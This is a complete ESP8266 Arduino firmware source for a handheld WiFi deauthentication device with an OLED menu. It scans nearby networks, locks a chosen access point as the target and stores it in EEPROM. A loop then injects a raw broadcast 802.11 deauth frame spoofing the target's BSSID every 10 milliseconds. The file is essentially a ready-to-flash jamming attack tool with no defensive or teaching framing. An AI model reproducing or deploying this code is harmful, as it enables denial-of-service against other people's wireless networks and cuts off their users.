#include <SPI.h> 
#include <Wire.h> 
#include <Adafruit_GFX.h> 
#include <Adafruit_SSD1306.h> 
#include <ESP8266WiFi.h> 
#include <EEPROM.h> // Puts target into non-volatile storage

extern "C" { 
  #include <user_interface.h> 
} 

#define SCREEN_WIDTH 128 
#define SCREEN_HEIGHT 64 
#define OLED_RESET -1 
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET); 

// GPIO Pin Configuration for Wemos D1 Mini
const int PIN_UP = 14;     // GPIO14 (D5) 
const int PIN_DOWN = 12;   // GPIO12 (D6) 
const int PIN_SELECT = 13; // GPIO13 (D7) 
const int PIN_BACK = 0;    // GPIO0 (D3) 

// UI Screen Navigation 
int currentScreen = 0; // 0: Main Menu, 1: Scan, 2: Deauth, 3: Info 
int menuIndex = 0; 
const int TOTAL_MENU = 3; 
String menuItems[TOTAL_MENU] = {"WiFi Scanner", "Deauth Engine", "System Info"}; 

// Network Feature Variables 
int totalScanResult = 0; 
int scanIndex = 0; 
String selectedSSID = ""; 
uint8_t selectedBSSID[6]; 
int selectedChannel = 1; 
bool isSSIDLocked = false; 
bool isAttacking = false; 

// Nethercap Telemetry Variables 
unsigned long lastPacketMillis = 0; 
unsigned long packetCount = 0; 

// Raw 802.11 Deauth Frame Template 
uint8_t deauthPacket[26] = { 
  0xC0, 0x00,                         // Type/Subtype: Deauth (0xC0) 
  0x00, 0x00,                         // Duration 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC Placeholder 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID MAC Placeholder 
  0x00, 0x00,                         // Sequence Number 
  0x07, 0x00                          // Reason Code (0x0007) 
}; 

// Forward Declarations for UI Functions
void tampilkanLoadingTersetrum();
void tampilkanMenuUtama();
void jalankanScanWiFi();
void tampilkanHasilScan();
void tampilkanHalamanDeauth();
void tampilkanHalamanInfo();

// Saves Target Parameters to EEPROM
void saveTargetToEEPROM() {
  EEPROM.begin(512);
  EEPROM.write(0, 1); // Signature flag: target exists
  EEPROM.write(1, selectedChannel);
  for (int i = 0; i < 6; i++) {
    EEPROM.write(2 + i, selectedBSSID[i]);
  }
  // Store SSID string length and characters
  int len = selectedSSID.length();
  if (len > 32) len = 32; // Bound protection
  EEPROM.write(8, len);
  for (int i = 0; i < len; i++) {
    EEPROM.write(9 + i, selectedSSID[i]);
  }
  EEPROM.commit();
}

// Automatically Loads Last Target on Bootup
void loadTargetFromEEPROM() {
  EEPROM.begin(512);
  if (EEPROM.read(0) == 1) { // Check if valid data exists
    selectedChannel = EEPROM.read(1);
    for (int i = 0; i < 6; i++) {
      selectedBSSID[i] = EEPROM.read(2 + i);
    }
    int len = EEPROM.read(8);
    selectedSSID = "";
    for (int i = 0; i < len; i++) {
      selectedSSID += (char)EEPROM.read(9 + i);
    }
    
    // Patch MACs directly into the packet array
    memcpy(&deauthPacket[10], selectedBSSID, 6); 
    memcpy(&deauthPacket[16], selectedBSSID, 6); 
    wifi_set_channel(selectedChannel);
    isSSIDLocked = true;
  }
}

void setup() { 
  Serial.begin(115200); 
  WiFi.mode(WIFI_STA); 
  WiFi.disconnect(); 
  
  pinMode(PIN_UP, INPUT_PULLUP); 
  pinMode(PIN_DOWN, INPUT_PULLUP); 
  pinMode(PIN_SELECT, INPUT_PULLUP); 
  pinMode(PIN_BACK, INPUT_PULLUP); 
  
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { 
    for(;;); 
  } 
  display.clearDisplay(); 
  tampilkanLoadingTersetrum();
  
  // Load persistent profile if available
  loadTargetFromEEPROM();
} 

void loop() { 
  // --- RAW 802.11 PACKET INJECTION ENGINE --- 
  if (isAttacking && isSSIDLocked) { 
    unsigned long currentMillis = millis(); 
    if (currentMillis - lastPacketMillis >= 10) { 
      lastPacketMillis = currentMillis; 
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0); 
      packetCount++; 
    } 
  } 
  
  // --- CONTROLLER & BUTTON NAVIGATION --- 
  if (currentScreen == 0) { 
    if (digitalRead(PIN_DOWN) == LOW) { menuIndex = (menuIndex + 1) % TOTAL_MENU; delay(150); } 
    if (digitalRead(PIN_UP) == LOW) { menuIndex = (menuIndex - 1 + TOTAL_MENU) % TOTAL_MENU; delay(150); } 
    if (digitalRead(PIN_SELECT) == LOW) { 
      if (menuIndex == 0) { jalankanScanWiFi(); currentScreen = 1; } 
      else if (menuIndex == 1) { currentScreen = 2; } 
      else if (menuIndex == 2) { currentScreen = 3; } 
      delay(200); 
    } 
    tampilkanMenuUtama(); 
  } else if (currentScreen == 1) { 
    if (totalScanResult > 0) { 
      if (digitalRead(PIN_DOWN) == LOW) { scanIndex = (scanIndex + 1) % totalScanResult; delay(150); } 
      if (digitalRead(PIN_UP) == LOW) { scanIndex = (scanIndex - 1 + totalScanResult) % totalScanResult; delay(150); } 
      if (digitalRead(PIN_SELECT) == LOW) { 
        selectedSSID = WiFi.SSID(scanIndex); 
        selectedChannel = WiFi.channel(scanIndex); 
        memcpy(selectedBSSID, WiFi.BSSID(scanIndex), 6); 
        
        memcpy(&deauthPacket[10], selectedBSSID, 6); 
        memcpy(&deauthPacket[16], selectedBSSID, 6); 
        wifi_set_channel(selectedChannel); 
        isSSIDLocked = true; 
        
        // Execute Flash Write Operation
        saveTargetToEEPROM();
        
        currentScreen = 0; 
        delay(200); 
      } 
    } 
    if (digitalRead(PIN_BACK) == LOW) { currentScreen = 0; delay(200); } 
    tampilkanHasilScan(); 
  } else if (currentScreen == 2) { 
    if (isSSIDLocked) { 
      if (digitalRead(PIN_SELECT) == LOW) { 
        isAttacking = !isAttacking; 
        packetCount = 0; 
        delay(250); 
      } 
    } 
    if (digitalRead(PIN_BACK) == LOW) { isAttacking = false; currentScreen = 0; delay(200); } 
    tampilkanHalamanDeauth(); 
  } else if (currentScreen == 3) { 
    if (digitalRead(PIN_BACK) == LOW) { currentScreen = 0; delay(200); } 
    tampilkanHalamanInfo(); 
  } 
}
// ================= RENDER GRAPHIC ENGINE ================= 

void tampilkanLoadingTersetrum() { 
  for (int i = 0; i < 30; i++) { 
    display.clearDisplay(); 
    int glitchX = random(-5, 6); 
    int glitchY = random(-2, 3); 
    if (random(0, 5) == 1) { 
      int lineY = random(0, 64); 
      display.drawFastHLine(0, lineY, 128, SSD1306_WHITE); 
    } 
    display.setTextSize(1); 
    display.setTextColor(SSD1306_WHITE); 
    display.setCursor(28 + glitchX, 24 + glitchY); 
    display.print("NAT-DEAUTHER"); 
    display.drawRect(24, 42, 80, 6, SSD1306_WHITE); 
    display.fillRect(26, 44, map(i, 0, 29, 0, 76), 2, SSD1306_WHITE); 
    display.display(); 
    delay(random(30, 70)); 
  } 
} 

void tampilkanMenuUtama() { 
  display.clearDisplay(); 
  display.setTextSize(1); 
  display.fillRect(0, 0, 128, 11, SSD1306_WHITE); 
  display.setTextColor(SSD1306_BLACK); 
  display.setCursor(4, 2); 
  display.print("BRUCE OS: NAT v1.5"); 
  display.setTextColor(SSD1306_WHITE); 
  display.setCursor(4, 15); 
  if(isSSIDLocked) { 
    String truncated = selectedSSID; 
    if(truncated.length() > 12) truncated = truncated.substring(0, 10) + ".."; 
    display.print("TG: "); display.print(truncated); 
    display.print(" [CH:"); display.print(selectedChannel); display.print("]"); 
  } else { 
    display.print("TG: [NO TARGET]"); 
  } 
  display.drawFastHLine(0, 25, 128, SSD1306_WHITE); 
  int startY = 29; 
  for (int i = 0; i < TOTAL_MENU; i++) { 
    int itemY = startY + (i * 11); 
    if (i == menuIndex) { 
      display.fillRect(2, itemY - 1, 118, 10, SSD1306_WHITE); 
      display.setTextColor(SSD1306_BLACK); 
      display.setCursor(6, itemY); 
      display.print("> "); display.print(menuItems[i]); 
    } else { 
      display.setTextColor(SSD1306_WHITE); 
      display.setCursor(6, itemY); 
      display.print(" "); display.print(menuItems[i]); 
    } 
  } 
  display.drawRect(123, 29, 4, 32, SSD1306_WHITE); 
  int indicatorHeight = 32 / TOTAL_MENU; 
  display.fillRect(124, 29 + (menuIndex * indicatorHeight), 2, indicatorHeight, SSD1306_WHITE); 
  display.display(); 
} 

void jalankanScanWiFi() { 
  display.clearDisplay(); 
  display.fillRect(0, 0, 128, 11, SSD1306_WHITE); 
  display.setTextColor(SSD1306_BLACK); 
  display.setCursor(4, 2); 
  display.print("WIFI SCANNER"); 
  display.setTextColor(SSD1306_WHITE); 
  display.setCursor(15, 32); 
  display.print("Scanning Air..."); 
  display.display(); 
  totalScanResult = WiFi.scanNetworks(); 
  scanIndex = 0; 
} 

void tampilkanHasilScan() { 
  display.clearDisplay(); 
  display.setTextSize(1); 
  display.fillRect(0, 0, 128, 11, SSD1306_WHITE); 
  display.setTextColor(SSD1306_BLACK); 
  display.setCursor(4, 2); 
  display.print("SELECT TARGET TO LOCK"); 
  display.setTextColor(SSD1306_WHITE); 
  if (totalScanResult == 0) { 
    display.setCursor(20, 32); 
    display.print("No Networks Found"); 
  } else { 
    int startItem = max(0, scanIndex - 2); 
    if (startItem + 4 > totalScanResult) startItem = max(0, totalScanResult - 4); 
    int endItem = min(totalScanResult, startItem + 4); 
    int lineCount = 0; 
    for (int i = startItem; i < endItem; i++) { 
      int itemY = 15 + (lineCount * 11); 
      if (i == scanIndex) { 
        display.fillRect(2, itemY - 1, 118, 10, SSD1306_WHITE); 
        display.setTextColor(SSD1306_BLACK); 
      } else { 
        display.setTextColor(SSD1306_WHITE); 
      } 
      String ssidNama = WiFi.SSID(i); 
      if(ssidNama.length() > 12) ssidNama = ssidNama.substring(0, 10) + ".."; 
      display.setCursor(4, itemY); 
      display.print(i == scanIndex ? "> " : " "); 
      display.print(ssidNama); 
      display.setCursor(90, itemY); 
      display.print(WiFi.RSSI(i)); display.print("dB"); 
      lineCount++; 
    } 
    display.drawRect(123, 15, 4, 46, SSD1306_WHITE); 
    int barSize = max(4, 46 / totalScanResult); 
    int barPos = map(scanIndex, 0, totalScanResult - 1, 15, 61 - barSize); 
    if(totalScanResult > 1) display.fillRect(124, barPos, 2, barSize, SSD1306_WHITE); 
  } 
  display.display(); 
} 

void tampilkanHalamanDeauth() { 
  display.clearDisplay(); 
  display.setTextSize(1); 
  display.fillRect(0, 0, 128, 11, SSD1306_WHITE); 
  display.setTextColor(SSD1306_BLACK); 
  display.setCursor(4, 2); 
  display.print("NETHERCAP ENGINE"); 
  display.setTextColor(SSD1306_WHITE); 
  if (!isSSIDLocked) { 
    display.setCursor(4, 24); 
    display.print("[!] NO TARGET LOCKED"); 
    display.setCursor(4, 38); 
    display.print("Go to Scan WiFi first."); 
  } else { 
    display.setCursor(4, 15); 
    display.print("TARGET : "); display.println(selectedSSID); 
    display.setCursor(4, 25); 
    display.print("CHAN   : "); display.print(selectedChannel); display.print(" [2.4GHz]"); 
    display.setCursor(4, 35); 
    display.print("PKTS   : "); display.println(isAttacking ? String(packetCount) : "0 (IDLE)"); 
    display.drawFastHLine(0, 46, 128, SSD1306_WHITE); 
    if (!isAttacking) { 
      display.fillRect(4, 51, 36, 11, SSD1306_WHITE); 
      display.setTextColor(SSD1306_BLACK); 
      display.setCursor(8, 53); display.print("IDLE"); 
      display.setTextColor(SSD1306_WHITE); 
      display.setCursor(46, 53); display.print("[SEL] TO ATTACK"); 
    } else { 
      display.fillRect(4, 51, 54, 11, SSD1306_WHITE); 
      display.setTextColor(SSD1306_BLACK); 
      display.setCursor(8, 53); display.print("ATTACK"); 
      display.setTextColor(SSD1306_WHITE); 
      if ((packetCount / 5) % 2 == 0) { 
        display.fillRect(64, 54, 6, 6, SSD1306_WHITE); 
      } else { 
        display.drawRect(64, 48, 6, 12, SSD1306_WHITE); 
      } 
      display.setCursor(76, 53); display.print("[SEL] STOP"); 
    } 
  } 
  display.display(); 
} 

void tampilkanHalamanInfo() { 
  display.clearDisplay(); 
  display.fillRect(0, 0, 128, 11, SSD1306_WHITE); 
  display.setTextColor(SSD1306_BLACK); 
  display.setCursor(4, 2); 
  display.print("SYSTEM TELEMETRY"); 
  display.setTextColor(SSD1306_WHITE); 
  display.setCursor(4, 17); 
  display.print("OS   : Nat Deauther 1.0"); 
  display.setCursor(4, 27); 
  display.print("CORE : ESP8266EX PROMISC"); 
  display.setCursor(4, 37); 
  display.print("INJ  : 802.11 DEAUTH"); 
  display.drawFastHLine(0, 50, 128, SSD1306_WHITE); 
  display.setCursor(4, 54); 
  display.print("[BACK] To Main Menu"); 
  display.display(); 
}